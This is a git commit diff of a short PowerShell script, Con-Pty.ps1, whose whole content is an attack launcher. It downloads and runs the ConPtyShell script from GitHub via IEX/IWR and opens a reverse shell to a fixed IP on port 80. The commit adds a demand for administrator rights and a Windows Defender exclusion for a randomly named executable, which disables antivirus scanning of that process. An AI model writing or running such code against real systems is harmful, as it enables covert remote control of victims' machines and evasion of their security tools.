49e9f02e327659876f817c279c33bb7365f2135f
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-04-26 18:11:10 -0400

    Update Con-Pty.ps1

--- Con-Pty.ps1
+++ Con-Pty.ps1
@@ -1,1 +1,4 @@
+#Requires -RunAsAdministrator
+Add-MpPreference -ExclusionProcess rejIER394593fje.exe
+
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.206 80
